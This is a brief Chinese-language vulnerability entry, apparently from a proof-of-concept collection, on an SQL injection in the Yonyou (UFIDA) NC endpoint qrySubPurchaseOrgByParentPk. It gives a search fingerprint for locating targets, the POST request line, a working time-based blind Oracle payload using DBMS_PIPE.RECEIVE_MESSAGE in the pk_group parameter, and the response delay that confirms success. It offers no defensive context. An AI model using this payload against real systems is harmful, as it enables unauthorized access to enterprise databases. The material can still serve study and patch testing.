# 用友NCqrySubPurchaseOrgByParentPk存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1`

**Payload**
```
pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
```
- **响应特征**：200 响应时间>=5s